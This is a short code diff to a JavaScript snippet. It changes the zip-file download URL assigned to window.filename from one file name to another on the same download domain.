@@ -1,3 +1,3 @@
 (function() {
-    window.filename = 'https://dows.so123so.top/sgxiwangyuopst.yzw.zip';
+    window.filename = 'https://dows.so123so.top/sgguoyouwnagixy.rxr.zip';
 })();
